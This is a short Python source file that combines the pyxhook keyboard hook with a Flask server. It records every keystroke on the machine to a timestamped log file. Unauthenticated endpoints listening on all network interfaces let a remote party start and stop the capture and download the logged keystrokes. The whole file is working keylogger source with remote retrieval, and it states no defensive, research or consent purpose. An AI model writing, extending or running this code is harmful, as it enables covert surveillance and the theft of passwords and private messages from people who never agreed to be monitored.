from flask import Flask, jsonify, request
import os
from datetime import datetime
import pyxhook

app = Flask(__name__)

log_file = None
hook_manager = None

def start_logging():
    global log_file, hook_manager
    log_file = f'keylogs_{datetime.now().strftime("%d-%m-%Y|%H-%M-%S")}.log'

    def OnKeyPress(event):
        with open(log_file, "a") as f:
            if event.Key == 'P_Enter':
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")

    hook_manager = pyxhook.HookManager()
    hook_manager.KeyDown = OnKeyPress
    hook_manager.HookKeyboard()

    try:
        hook_manager.start()
        return "Logging started"
    except Exception as ex:
        return f"Error starting logging: {ex}"

def stop_logging():
    global hook_manager
    if hook_manager:
        hook_manager.cancel()
        hook_manager = None
        return "Logging stopped"
    else:
        return "Logging was not started"

def get_logs():
    global log_file
    if log_file and os.path.exists(log_file):
        with open(log_file, 'r') as f:
            return f.read()
    return "No logs available"

@app.route('/start_logging', methods=['POST'])
def start_logging_endpoint():
    status = start_logging()
    return jsonify({'status': status})

@app.route('/stop_logging', methods=['POST'])
def stop_logging_endpoint():
    status = stop_logging()
    return jsonify({'status': status})

@app.route('/get_logs', methods=['GET'])
def get_logs_endpoint():
    logs = get_logs()
    return jsonify({'logs': logs})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
